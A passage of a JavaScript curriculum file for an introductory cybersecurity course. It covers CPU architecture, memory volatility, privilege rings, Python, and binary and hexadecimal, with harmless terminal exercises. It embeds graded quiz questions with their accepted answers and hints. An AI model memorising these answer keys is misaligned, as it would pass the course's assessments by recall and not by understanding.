/**
 * CALION Cybersecurity Academy — Authoritative Pre-Security Curriculum Manifest (v2.1)
 * Independent, Modern 12-Room Foundational Cybersecurity Journey
 * 
 * Hierarchy:
 * Stage 1: Computing & Hardware Architecture (Rooms 01–03)
 * Stage 2: Operating Systems & System Internals (Rooms 04–06)
 * Stage 3: Networking Fundamentals & Protocols (Rooms 07–09)
 * Stage 4: Web Security & Applied Cryptography (Rooms 10–12)
 * 
 * Total: 12 Foundational Rooms | 42 Structured Tasks | 54 Questions (42 Task + 12 Capstone) | 1,950 Max Curriculum XP
 */

(function (root, factory) {
  if (typeof module === 'object' && module.exports) {
    module.exports = factory();
  } else {
    const data = factory();
    root.CALION_PRE_SECURITY_CURRICULUM = data.curriculum;
    root.CALION_PRE_SECURITY_ROOMS = data.rooms;
    root.CALION_PRE_SECURITY_ROOM_MAP = data.roomMap;
    root.CALION_PRE_SECURITY_STAGES = data.stages;
  }
})(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  function formatVisualSlots(answerStr) {
    if (!answerStr) return '';
    const words = String(answerStr).trim().split(/\s+/);
    return words.map(function(w) {
      return w.split('').map(function(c) {
        return /[a-zA-Z0-9]/.test(c) ? '_' : c;
      }).join(' ');
    }).join('   ');
  }

  const stages = [
  {
    "id": "ps-stage-01",
    "order": 1,
    "title": "Computing & Hardware Architecture",
    "tagline": "Von Neumann Model, CPU Cycles, Memory Hierarchy & Digital Logic",
    "description": "Master foundational computer architecture: the CPU instruction cycle, register banks, memory latency hierarchies, digital logic gates, Python execution fundamentals, and virtualization rings.",
    "roomCount": 3,
    "estimatedTime": "3 hr 00 min",
    "color": "#0284c7",
    "icon": "memory"
  },
  {
    "id": "ps-stage-02",
    "order": 2,
    "title": "Operating Systems & System Internals",
    "tagline": "Linux FHS, Bash Automation, Windows NT & Access Control Lists",
    "description": "Explore the core abstractions of modern operating systems: Linux virtual filesystems, command-line stream pipelines, user/group management, Bash scripting, Windows security identifiers (SIDs), PowerShell, and Event Viewer security logs.",
    "roomCount": 3,
    "estimatedTime": "3 hr 45 min",
    "color": "#6366f1",
    "icon": "terminal"
  },
  {
    "id": "ps-stage-03",
    "order": 3,
    "title": "Networking Fundamentals & Protocols",
    "tagline": "OSI Reference Model, TCP 3-Way Handshake, Packet Routing & Firewalls",
    "description": "Demystify network data transmission: protocol encapsulation, Layer 2 MAC/ARP resolution, IP addressing, ICMP, DHCP mechanics, TCP state machines, DNS domain resolution hierarchy, NAT translation, Wireshark packet inspection, and stateful packet filtering.",
    "roomCount": 3,
    "estimatedTime": "4 hr 00 min",
    "color": "#10b981",
    "icon": "hub"
  },
  {
    "id": "ps-stage-04",
    "order": 4,
    "title": "Web Security & Applied Cryptography",
    "tagline": "HTTP/S Headers, REST APIs, Symmetric/Asymmetric Ciphers & Threat Models",
    "description": "Understand the foundational mechanisms of modern application security: stateless HTTP mechanics, browser isolation boundaries, developer tools, REST API authentication, cryptographic hashing, PKI certificates, OpenSSL, and the CIA triad defense-in-depth principles.",
    "roomCount": 3,
    "estimatedTime": "3 hr 45 min",
    "color": "#00F0FF",
    "icon": "lock"
  }
];

  const rooms = [
  {
    "id": "ps-room-01",
    "legacyId": "room-01",
    "order": 1,
    "stageId": "ps-stage-01",
    "stageTitle": "Computing & Hardware Architecture",
    "stageOrder": 1,
    "title": "Introduction to Computers & Von Neumann Architecture",
    "tagline": "Von Neumann Model, CPU Execution Cycles & Hardware Privilege Rings",
    "description": "Understand the core physical components of modern computers: the Von Neumann architecture, CPU fetch-decode-execute cycle, memory hierarchy, privilege rings, and how programs execute via compilers and interpreters.",
    "difficulty": "Foundational",
    "estimatedMinutes": 30,
    "xp": 50,
    "prerequisites": [],
    "whyAreYouHere": "Before analyzing software vulnerabilities, cybersecurity engineers must understand how hardware executes instructions and manages memory at the silicon level.",
    "diagramSvg": "<svg viewBox=\"0 0 600 180\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"160\" height=\"140\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"100\" y=\"45\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">CPU Core</text><rect x=\"35\" y=\"60\" width=\"130\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"100\" y=\"82\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Control Unit</text><rect x=\"35\" y=\"105\" width=\"130\" height=\"40\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"100\" y=\"130\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">ALU &amp; Registers</text><line x1=\"180\" y1=\"90\" x2=\"260\" y2=\"90\" stroke=\"#00f0ff\" stroke-width=\"3\" stroke-dasharray=\"4\"/><polygon points=\"260,86 268,90 260,94\" fill=\"#00f0ff\"/><polygon points=\"180,86 172,90 180,94\" fill=\"#00f0ff\"/><rect x=\"268\" y=\"20\" width=\"140\" height=\"140\" rx=\"8\" fill=\"#1e293b\" stroke=\"#6366f1\" stroke-width=\"2\"/><text x=\"338\" y=\"45\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Main Memory</text><rect x=\"283\" y=\"65\" width=\"110\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"338\" y=\"87\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Instructions (Code)</text><rect x=\"283\" y=\"110\" width=\"110\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"338\" y=\"132\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Data (Heap/Stack)</text><line x1=\"408\" y1=\"90\" x2=\"460\" y2=\"90\" stroke=\"#a855f7\" stroke-width=\"3\"/><polygon points=\"460,86 468,90 460,94\" fill=\"#a855f7\"/><polygon points=\"408,86 400,90 408,94\" fill=\"#a855f7\"/><rect x=\"468\" y=\"40\" width=\"110\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#a855f7\" stroke-width=\"2\"/><text x=\"523\" y=\"80\" fill=\"#c084fc\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">I/O Devices</text><text x=\"523\" y=\"105\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Disk / Network</text></svg>",
    "tryInteractive": {
      "expectedCommand": "lscpu",
      "simulatedOutput": "Architecture:           x86_64\nCPU op-mode(s):         32-bit, 64-bit\nAddress sizes:          39 bits physical, 48 bits virtual\nByte Order:             Little Endian\nCPU(s):                 8\nModel name:             Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz"
    },
    "terminalCommands": [
      {
        "command": "lscpu",
        "output": "Architecture:           x86_64\nCPU op-mode(s):         32-bit, 64-bit\nByte Order:             Little Endian\nCPU(s):                 8\nModel name:             Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz\nVirtualization:         VT-x"
      },
      {
        "command": "free -h",
        "output": "               total        used        free      shared  buff/cache   available\nMem:            15Gi       4.2Gi       8.5Gi       240Mi       2.8Gi        10Gi\nSwap:          2.0Gi          0B       2.0Gi"
      },
      {
        "command": "python3 -c 'print(2**16)'",
        "output": "65536"
      }
    ],
    "objectives": [
      "Identify the four primary components of the Von Neumann architecture",
      "Trace the instruction execution flow through the CPU fetch-decode-execute cycle",
      "Differentiate between volatile main memory (RAM) and non-volatile storage",
      "Explain the security boundary enforced by CPU hardware privilege rings (Ring 0 vs Ring 3)"
    ],
    "lessons": [
      {
        "id": "ps-task-01-01",
        "taskNumber": 1,
        "title": "Von Neumann Architecture & The Execution Cycle",
        "objectives": [
          "Explain the stored-program concept proposed by John von Neumann",
          "Trace the three phases of the CPU fetch-decode-execute instruction cycle",
          "Identify the primary CPU registers: Program Counter, Instruction Register, and Accumulator"
        ],
        "concept": "The Von Neumann architecture forms the foundation of nearly every general-purpose computing system. Proposed in 1945, its central breakthrough was the stored-program concept: both program instructions and operational data share the exact same physical addressable memory space.\n\nThe system comprises three primary subsystems connected by system buses:\n1. Central Processing Unit (CPU): Contains the Arithmetic Logic Unit (ALU) for arithmetic/logical operations and the Control Unit (CU) which directs instruction sequencing.\n2. Main Memory (RAM): A linear sequence of byte-addressable cells storing active code and data.\n3. Input/Output (I/O) Interfaces: Bridges communicating with peripheral storage, network cards, and human interfaces.\n\nThe execution cycle operates in an endless loop:\n- FETCH: The Control Unit reads the memory address stored in the Program Counter (PC), loads the instruction from RAM across the data bus into the Instruction Register (IR), and increments the PC.\n- DECODE: The Instruction Decoder interprets the opcode (operation code) and operands.\n- EXECUTE: The ALU executes the required arithmetic or logical operation, storing results in accumulator registers or memory.\n\nFrom a security perspective, because code and data share the same memory space, an adversary who can overwrite data memory (e.g., via a buffer overflow) can potentially divert the Program Counter to execute malicious shellcode.",
        "whyItMatters": "Nearly all memory corruption exploits (buffer overflows, return-oriented programming) exploit the Von Neumann architectural reality that code and data share the exact same addressable physical memory.",
        "examples": [
          "Program Counter (PC): Holds the address of the next machine instruction to be fetched.",
          "Memory Address Register (MAR): Holds the physical memory address currently being read or written.",
          "Memory Data Register (MDR): Holds the actual data payload read from or written to memory."
        ],
        "commands": [
          {
            "cmd": "lscpu",
            "desc": "Display CPU architecture, cores, cache lines, and virtualization flags in Linux"
          },
          {
            "cmd": "cat /proc/cpuinfo",
            "desc": "Inspect detailed low-level hardware attributes for each logical processor core"
          }
        ],
        "exercise": {
          "prompt": "Run 'lscpu' in the terminal sandbox to inspect CPU core architecture and byte endianness:",
          "command": "lscpu",
          "expectedOutput": "Architecture:           x86_64\nCPU op-mode(s):         32-bit, 64-bit\nByte Order:             Little Endian\nCPU(s):                 8\nModel name:             Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz"
        },
        "reviewSummary": {
          "coreTakeaway": "Von Neumann computers store code and data in the same unified memory space, making execution flow redirection possible when memory boundaries are violated.",
          "learningOutcome": "Mastered CPU instruction execution cycles and register operations."
        }
      },
      {
        "id": "ps-task-01-02",
        "taskNumber": 2,
        "title": "Memory Hierarchy & Volatility",
        "objectives": [
          "Compare memory latency and throughput across registers, L1/L2/L3 caches, RAM, and NVMe storage",
          "Define memory volatility and explain the RFC 3227 Order of Volatility in incident response",
          "Identify the risks of Cold Boot attacks against residual physical DRAM charges"
        ],
        "concept": "Computer memory is organized in a hierarchical trade-off between latency, cost, and physical capacity. At the pinnacle are CPU Internal Registers, operating at CPU clock frequency (<1 nanosecond latency) but storing only dozens of bytes.\n\nNext are hardware caches:\n- L1 Cache: Split into Instruction (L1i) and Data (L1d) caches, typically 32\u201364 KB per core, ~1 ns latency.\n- L2 Cache: Dedicated per-core cache, ~512 KB\u20131 MB, ~3\u20135 ns latency.\n- L3 Cache: Shared across all cores, 16\u201364 MB, ~10\u201320 ns latency.\n\nBelow cache lies Main Memory (DRAM): High capacity (8\u2013128 GB), ~60\u201380 ns latency. DRAM is strictly volatile: it relies on capacitive charge retention that degrades within milliseconds without electrical power.\n\nAt the bottom lies Non-Volatile Storage (NVMe SSDs, SATA drives): Retains persistent data across power cycles with access latencies measured in microseconds (SSDs) or milliseconds (HDDs).\n\nIn digital forensics and incident response, memory volatility dictates evidence preservation order (RFC 3227 Order of Volatility): live RAM must be captured immediately before powering down an affected machine, as ephemeral volatile memory contains encryption keys, active process injections, and unencrypted network sockets.",
        "whyItMatters": "Volatile RAM holds live plaintext credentials, active malware processes, and decrypted communications that evaporate the instant power is disconnected.",
        "examples": [
          "Order of Volatility: Registers/Cache -> Physical RAM -> Network Sockets -> Disk Storage -> Archival Backups.",
          "Cold Boot Attack: Freezing DRAM chips immediately after power loss to read residual capacitive state before decay."
        ],
        "commands": [
          {
            "cmd": "free -h",
            "desc": "Display current total, used, and free RAM and swap space in human-readable units"
          },
          {
            "cmd": "vmstat 1 5",
            "desc": "Stream real-time virtual memory, process, and paging performance metrics every second"
          }
        ],
        "exercise": {
          "prompt": "Check current system memory allocation and swap space in human-readable units using 'free -h':",
          "command": "free -h",
          "expectedOutput": "               total        used        free      shared  buff/cache   available\nMem:            15Gi       4.2Gi       8.5Gi       240Mi       2.8Gi        10Gi\nSwap:          2.0Gi          0B       2.0Gi"
        },
        "reviewSummary": {
          "coreTakeaway": "Memory exists in a strict trade-off between speed and persistence; volatile RAM must always be acquired first during incident response.",
          "learningOutcome": "Understood the physical memory hierarchy and RFC 3227 order of volatility."
        }
      },
      {
        "id": "ps-task-01-03",
        "taskNumber": 3,
        "title": "Hardware Privilege Rings & Kernel Isolation",
        "objectives": [
          "Distinguish between Ring 0 (Kernel Mode / Supervisor) and Ring 3 (User Mode)",
          "Trace how user applications invoke system calls to request privileged hardware operations",
          "Explain how privilege escalation vulnerabilities cross the user-to-kernel boundary"
        ],
        "concept": "Modern x86 and ARM processors enforce hardware privilege levels known as Hierarchical Protection Rings. These rings isolate critical operating system functions from untrusted user applications.\n\nx86 architecture defines four rings (Ring 0 to Ring 3):\n- Ring 0 (Kernel Mode / Supervisor): The most privileged ring. Code executing in Ring 0 has unrestricted access to all physical hardware instructions, memory addresses, CPU control registers (CR0, CR3, CR4), and I/O ports. Device drivers and the operating system kernel execute here.\n- Ring 1 & Ring 2: Historically designated for OS services and device drivers, but largely unused by modern operating systems.\n- Ring 3 (User Mode): The least privileged ring. Standard user applications (browsers, text editors, user processes) execute here with heavily restricted instructions. Ring 3 code cannot directly access hardware, modify memory page tables, or disable CPU interrupts.\n\nWhen a User Mode application requires hardware access (e.g., reading a file from disk or sending a network packet), it cannot do so directly. It must trigger a hardware interrupt or execute a special instruction (such as 'syscall' on x86-64 or 'int 0x80' on x86) to request a System Call. The CPU transitions privilege from Ring 3 to Ring 0, the kernel validates the request and parameters, performs the requested action, and returns control back to Ring 3.\n\nPrivilege escalation exploits seek to break out of Ring 3 into Ring 0 through kernel vulnerabilities, granting an attacker total control over the entire machine.",
        "whyItMatters": "Privilege rings provide the fundamental silicon-enforced barrier preventing malicious user-space applications from compromising the underlying operating system.",
        "examples": [
          "Ring 0 (Supervisor): Full physical hardware and memory access; kernel space.",
          "Ring 3 (User Space): Sandboxed execution; hardware access strictly gated via system calls."
        ],
        "commands": [
          {
            "cmd": "uname -r",
            "desc": "Output the current Linux operating system kernel release version"
          },
          {
            "cmd": "dmesg | head -n 20",
            "desc": "Examine kernel ring buffer initialization messages and hardware drivers"
          }
        ],
        "exercise": {
          "prompt": "Check the running Linux kernel release version using 'uname -r':",
          "command": "uname -r",
          "expectedOutput": "6.5.0-44-generic"
        },
        "reviewSummary": {
          "coreTakeaway": "Hardware privilege rings guarantee that user-space software cannot execute kernel-level instructions without explicit OS mediation.",
          "learningOutcome": "Understood Ring 0 vs Ring 3 execution models and system call mediation."
        }
      },
      {
        "id": "ps-task-01-04",
        "taskNumber": 4,
        "title": "Programming Execution & Python Fundamentals for Security",
        "objectives": [
          "Distinguish between compiled machine code and interpreted bytecode execution",
          "Understand variables, data types, conditions, and loops in Python",
          "Explain why scripting languages like Python are used for security automation"
        ],
        "concept": "To interact effectively with computers, humans write code in high-level programming languages. However, processors can only execute binary machine code instructions (opcodes like 0x90 for NOP, 0xE9 for JMP).\n\nLanguages bridge this divide in two primary ways:\n1. Compiled Languages (C, C++, Rust, Go): A compiler translates source code directly into architecture-specific machine code binaries ahead of time. Execution is extremely fast and has raw access to memory pointers, but compiled binaries are not portable across different CPU architectures without recompilation.\n2. Interpreted / Bytecode Languages (Python): An interpreter parses source code line-by-line, converts it into intermediate bytecode (.pyc files), and executes it inside a virtual machine runtime (the Python Virtual Machine / PVM). While slower than raw machine code, Python is cross-platform, rapid to develop, and boasts extensive libraries for networking, cryptography, and automation.\n\nCore Python Security Constructs:\n- Variables & Types: Integers, strings ('192.168.1.1'), booleans (True/False), and lists (['22/tcp', '80/tcp']).\n- Conditionals: 'if port in open_ports:' for filtering targets or security events.\n- Loops: 'for ip in target_subnet:' to iterate over network endpoints or log entries.\n- Functions: Encapsulating repetitive security logic, such as hash verification or banner grabbing.",
        "whyItMatters": "Security engineers write Python scripts to automate repetitive tasks: parsing gigabytes of firewall logs, auditing user permissions, querying REST APIs, and generating alerts.",
        "examples": [
          "Automation Script: Reading an IP blacklist and checking if any internal machine communicated with those IPs.",
          "Log Parser: Iterating through an auth.log file with Python to detect brute-force login attempts."
        ],
        "commands": [
          {
            "cmd": "python3 --version",
            "desc": "Check installed Python runtime version"
          },
          {
            "cmd": "python3 -c 'for i in [21,22,80,443]: print(f\"Port {i}: active\")'",
            "desc": "Run an inline Python loop to simulate port checking"
          }
        ],
        "exercise": {
          "prompt": "Run an inline Python command to verify the Python 3 interpreter environment:",
          "command": "python3 -c 'print(\"Python runtime ready for automation\")'",
          "expectedOutput": "Python runtime ready for automation"
        },
        "reviewSummary": {
          "coreTakeaway": "Computers execute machine code; Python converts high-level scripts into bytecode executed by the PVM, enabling rapid security automation.",
          "learningOutcome": "Understood program execution models and Python's role in security operations."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-01-01",
        "taskId": "ps-task-01-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "Which CPU register stores the memory address of the next machine instruction to be fetched?",
        "canonicalAnswer": "program counter",
        "acceptedAnswers": [
          "program counter",
          "pc",
          "Program Counter",
          "PC",
          "instruction pointer",
          "Instruction Pointer",
          "ip",
          "IP"
        ],
        "visualSlots": "_ _ _ _ _ _ _   _ _ _ _ _ _ _",
        "answerLength": 15,
        "hints": [
          "It is responsible for tracking which instruction comes next in memory.",
          "In x86 assembly, this register is named EIP or RIP (Instruction Pointer); in classical computer architecture, it is known as the Program Counter."
        ],
        "hint": "It counts instructions sequentially in memory (also known as the Instruction Pointer)...",
        "explanation": "The Program Counter (PC) / Instruction Pointer (IP) holds the memory address of the next instruction to be fetched from memory into the Instruction Register.",
        "xp": 25
      },
      {
        "id": "ps-q-01-02",
        "taskId": "ps-task-01-02",
        "taskIndex": 1,
        "type": "choice",
        "question": "What happens to the data stored in volatile memory (such as DRAM) when electrical power is completely cut off?",
        "options": [
          "Data is permanently written to disk automatically",
          "Data decays and is completely erased",
          "Data remains intact indefinitely until manually deleted",
          "Data is securely encrypted by the CPU"
        ],
        "correctIndex": 1,
        "hints": [
          "Think about the physical definition of volatile storage.",
          "Capacitors in DRAM require constant electrical refresh cycles to hold bits."
        ],
        "hint": "Think about the definition of volatile...",
        "explanation": "Volatile memory relies on continuous electrical charge refresh cycles. Without power, the capacitive charge degrades and all stored data is lost.",
        "xp": 25
      },
      {
        "id": "ps-q-01-03",
        "taskId": "ps-task-01-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "In x86 CPU hardware privilege ring architecture, which ring represents Kernel Mode with full hardware execution access?",
        "canonicalAnswer": "ring 0",
        "acceptedAnswers": [
          "ring 0",
          "0",
          "Ring 0"
        ],
        "visualSlots": "_ _ _ _   _",
        "answerLength": 6,
        "hints": [
          "It is the lowest-numbered, most privileged ring.",
          "A single digit from 0 to 3."
        ],
        "hint": "The most privileged level, represented by a single digit...",
        "explanation": "Ring 0 (Supervisor mode) provides total, unrestricted access to the underlying processor instructions, memory page tables, and hardware peripherals.",
        "xp": 25
      },
      {
        "id": "ps-q-01-04",
        "taskId": "ps-task-01-04",
        "taskIndex": 3,
        "type": "exact",
        "question": "What intermediate format does the Python interpreter compile source code into before executing it inside the virtual machine?",
        "canonicalAnswer": "bytecode",
        "acceptedAnswers": [
          "bytecode",
          "Bytecode",
          "byte code"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _",
        "answerLength": 8,
        "hints": [
          "It is an intermediate representation stored in .pyc files.",
          "It starts with 'byte' and ends with 'code'."
        ],
        "hint": "Intermediate code executed by the Python Virtual Machine (PVM)...",
        "explanation": "Python compiles human-readable source code into intermediate bytecode, which is then executed instruction-by-instruction by the Python Virtual Machine (PVM).",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 01 Capstone Assessment: Architecture & Forensics Synthesis",
      "scenario": "A digital forensics investigator arrives at a crime scene. A server is actively running an ongoing ransomware attack, encrypting files on disk. The investigator must decide whether to immediately pull the power plug from the wall or acquire live system state first.",
      "taskId": "ps-task-01-assessment",
      "question": {
        "id": "ps-q-01-capstone",
        "type": "exact",
        "question": "Per RFC 3227 Order of Volatility, which component must the forensics investigator preserve before cutting power, because its contents will evaporate immediately without electricity?",
        "canonicalAnswer": "ram",
        "acceptedAnswers": [
          "ram",
          "RAM",
          "memory",
          "main memory",
          "volatile memory"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Think of the primary volatile storage where active processes and encryption keys reside.",
          "A 3-letter acronym for Random Access Memory."
        ],
        "hint": "3-letter acronym for volatile main memory...",
        "explanation": "RAM (Random Access Memory) contains volatile live encryption keys, active network connections, and unwritten process memory. Pulling the power plug immediately wipes this critical forensic evidence.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-02",
    "legacyId": "room-02",
    "order": 2,
    "stageId": "ps-stage-01",
    "stageTitle": "Computing & Hardware Architecture",
    "stageOrder": 1,
    "title": "Digital Logic, Data Representation & Bitwise Operations",
    "tagline": "Binary Arithmetic, Hexadecimal, Bitwise Logic & Character Encoding",
    "description": "Master foundational low-level data representation: binary arithmetic, bitwise operations (AND, OR, XOR, NOT), hexadecimal encoding, ASCII/UTF-8 character sets, and Python bitwise scripting.",
    "difficulty": "Foundational",
    "estimatedMinutes": 35,
    "xp": 50,
    "prerequisites": [
      "ps-room-01"
    ],
    "whyAreYouHere": "Every cryptographic cipher, network packet header, memory offset, and machine code instruction is fundamentally expressed in binary and hexadecimal format.",
    "diagramSvg": "<svg viewBox=\"0 0 600 160\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"160\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"100\" y=\"50\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Binary (Base 2)</text><text x=\"100\" y=\"80\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"14\" text-anchor=\"middle\">0 1 0 0 0 0 0 1</text><text x=\"100\" y=\"110\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">8 bits = 1 Byte</text><line x1=\"180\" y1=\"80\" x2=\"220\" y2=\"80\" stroke=\"#00f0ff\" stroke-width=\"2\"/><polygon points=\"220,77 226,80 220,83\" fill=\"#00f0ff\"/><rect x=\"226\" y=\"20\" width=\"150\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#6366f1\" stroke-width=\"2\"/><text x=\"301\" y=\"50\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Hex (Base 16)</text><text x=\"301\" y=\"80\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"14\" text-anchor=\"middle\">0x41</text><text x=\"301\" y=\"110\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">2 Nibbles (4b+4b)</text><line x1=\"376\" y1=\"80\" x2=\"416\" y2=\"80\" stroke=\"#a855f7\" stroke-width=\"2\"/><polygon points=\"416,77 422,80 416,83\" fill=\"#a855f7\"/><rect x=\"422\" y=\"20\" width=\"150\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#a855f7\" stroke-width=\"2\"/><text x=\"497\" y=\"50\" fill=\"#c084fc\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">ASCII Character</text><text x=\"497\" y=\"80\" fill=\"#4ade80\" font-family=\"JetBrains Mono\" font-size=\"20\" font-weight=\"bold\" text-anchor=\"middle\">'A'</text><text x=\"497\" y=\"110\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Decimal: 65</text></svg>",
    "tryInteractive": {
      "expectedCommand": "python3 -c 'print(hex(65))'",
      "simulatedOutput": "0x41"
    },
    "terminalCommands": [
      {
        "command": "python3 -c 'print(hex(65))'",
        "output": "0x41"
      },
      {
        "command": "printf '%x\\n' 255",
        "output": "ff"
      },
      {
        "command": "python3 -c 'print(bin(0x5A ^ 0x3C))'",
        "output": "0b1100110"
      }
    ],
    "objectives": [
      "Perform binary to decimal and binary to hexadecimal conversions fluently",
      "Apply bitwise logic operators (AND, OR, XOR, NOT, Shift) to bitmasks",
      "Understand signed integer representation and character encodings (ASCII/UTF-8)",
      "Write Python scripts using bitwise operators for data manipulation"
    ],
    "lessons": [
      {
        "id": "ps-task-02-01",
        "taskNumber": 1,
        "title": "Binary & Hexadecimal Numbering Systems",
        "objectives": [
          "Explain why computers use base-2 binary representation",
          "Convert values between binary, decimal, and hexadecimal notations",
          "Define a nibble and explain how two nibbles form an 8-bit byte"
        ],
        "concept": "Digital computers represent all internal states using electrical transistors functioning as binary switches: 0 (off) or 1 (on). A single binary digit is a bit; eight bits form a byte, capable of representing 256 unique values (0 to 255 in unsigned decimal notation).\n\nBecause raw binary strings (e.g., 1101111010101101) are cumbersome for humans to read, computer scientists use Hexadecimal (Base 16). Base 16 uses digits 0\u20139 and letters A\u2013F (where A=10, B=11, C=12, D=13, E=14, F=15). Exactly four binary bits (a nibble) correspond cleanly to one hexadecimal character:\n- 0000 = 0x0\n- 1010 = 0xA (decimal 10)\n- 1111 = 0xF (decimal 15)\n- 1111 1111 = 0xFF (decimal 255)\n\nIn programming and cybersecurity tools, hexadecimal values are conventionally prefixed with '0x' (e.g., 0x7FFF). Memory addresses, cryptographic hashes, MAC addresses, and raw packet bytes are universally represented in hexadecimal.",
        "whyItMatters": "Hexadecimal is the standard lingua franca of reverse engineering, memory dump inspection, and network packet analysis.",
        "examples": [
          "Binary 1100 = 1*(8) + 1*(4) + 0*(2) + 0*(1) = Decimal 12 = Hex 0xC",
          "Byte 0x41 in hexadecimal = Decimal 65 = Character 'A' in standard ASCII"
        ],
        "commands": [
          {
            "cmd": "printf '%x\\n' 255",
            "desc": "Convert decimal 255 to hexadecimal notation using standard shell printf"
          },
          {
            "cmd": "echo -n 'CALION' | xxd -p",
            "desc": "Print the raw hexadecimal byte dump of a string"
          }
        ],
        "exercise": {
          "prompt": "Convert decimal 255 to hexadecimal using 'printf '%x\\n' 255':",
          "command": "printf '%x\\n' 255",
          "expectedOutput": "ff"
        },
        "reviewSummary": {
          "coreTakeaway": "Hexadecimal directly compresses 4 binary bits into a single readable character, serving as the universal language of memory and packet analysis.",
          "learningOutcome": "Mastered binary-hexadecimal-decimal conversions."
        }
      },
      {
        "id": "ps-task-02-02",
        "taskNumber": 2,
        "title": "Bitwise Operators & Cryptographic Logic",
        "objectives": [
          "Calculate bitwise truth tables for AND, OR, XOR, and NOT",
          "Explain the self-reversing mathematical property of XOR: (A ^ B) ^ B = A",
          "Identify how stream ciphers and one-time pads utilize XOR logic"
        ],
        "concept": "Bitwise operations manipulate individual bits directly within the CPU ALU in a single clock cycle. The primary bitwise operators are:\n- AND (&): Outputs 1 only if BOTH input bits are 1. Commonly used for subnet masking and bit extraction.\n- OR (|): Outputs 1 if AT LEAST ONE input bit is 1. Commonly used for setting flag bits.\n- NOT (~): Unary inversion. Inverts every bit (0 becomes 1, 1 becomes 0).\n- XOR (^): Exclusive OR. Outputs 1 if and only if the input bits are DIFFERENT (0^1=1, 1^0=1, 0^0=0, 1^1=0).\n\nXOR is uniquely significant in cybersecurity and cryptography for two mathematical properties:\n1. Reversibility: (A ^ B) ^ B = A. If you XOR plaintext A with key B to produce ciphertext C, XORing C with key B reproduces the exact plaintext A. This property forms the foundation of One-Time Pads and stream ciphers (such as ChaCha20 and AES-CTR mode).\n2. Equal Probability: When a random key bit is XORed with any plaintext bit, the resulting bit has an exact 50% probability of being 0 or 1, introducing zero statistical bias.",
        "whyItMatters": "The XOR operation is the mathematical bedrock of symmetric cryptography, one-time pads, and malware obfuscation techniques.",
        "examples": [
          "Bitwise AND: 1100 & 1010 = 1000",
          "Bitwise OR:  1100 | 1010 = 1110",
          "Bitwise XOR: 1100 ^ 1010 = 0110"
        ],
        "commands": [
          {
            "cmd": "python3 -c 'print(hex(0x41 ^ 0x20))'",
            "desc": "Compute bitwise XOR in Python (0x41 'A' ^ 0x20 toggles case to 0x61 'a')"
          }
        ],
        "exercise": {
          "prompt": "Evaluate bitwise XOR between 0x41 and 0x20 in Python to observe ASCII case toggling:",
          "command": "python3 -c 'print(hex(0x41 ^ 0x20))'",
          "expectedOutput": "0x61"
        },
        "reviewSummary": {
          "coreTakeaway": "Bitwise XOR is self-inverting and universally utilized across symmetric encryption, hashing primitives, and obfuscation.",
          "learningOutcome": "Understood bitwise logic operations and the cryptographic properties of XOR."
        }
      },
      {
        "id": "ps-task-02-03",
        "taskNumber": 3,
        "title": "Character Encoding: ASCII, Unicode & Endianness",
        "objectives": [
          "Explain how character encoding standards map numerical bytes to human characters",
          "Distinguish between 7-bit ASCII and multi-byte UTF-8 encoding",
          "Contrast Little-Endian (x86 memory) with Big-Endian (Network Byte Order)"
        ],
